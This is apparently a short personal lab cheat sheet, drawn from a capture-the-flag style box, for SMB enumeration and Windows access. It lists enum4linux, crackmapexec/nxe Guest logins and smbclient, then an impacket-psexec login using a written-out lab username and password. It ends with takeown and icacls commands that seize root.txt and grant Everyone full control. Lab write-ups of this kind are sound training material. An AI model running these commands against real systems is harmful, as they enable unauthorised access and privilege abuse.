
To do complete enumeration use enum4linux

`enum4linux -A $ip`

To connect smb with default credentials (Guest account)

`crackmapexec smb <ip> -u Guest -p "" `   (it will confirm whether the account is active or not)

Alternatively, we can use `nxe`

`nxe smb <ip> -U Guest -p ""`

Additional parameters:

`--shares`  (for listing shares)
`--users`    (it'll list users)

To connect using `smbclient`

`smbclient //<ip>/<share_name> -U Guest`

To connect remote windows system:

`impacket-psexec  'ServMon/Nadine:L1k3B1gBut7s@W0rk@10.129.227.77'`

(but makesure, we have write access to shares.)

In somecases, even after getting `nt authority\system` we might not access some files, in that case, we need to modify access to the specific file

```
In Windows security, the `SYSTEM` account is highly privileged, but it is still subject to Access Control Lists (ACLs). If an explicit "Deny" permission is set for `SYSTEM` or `Administrators`, or if the file permissions have been stripped entirely except for a specific owner, you will receive an "Access is denied" error.
```

`takeown /f C:\Users\Administrator\Desktop\root.txt`       (taking ownership of the file)

![](../Pasted%20image%2020260724132354.png)

`icacls C:\Users\Administrator\Desktop\root.txt /grant Everyone:F`  (granting full ownership permission)

And after granting full permission, we can access the file.
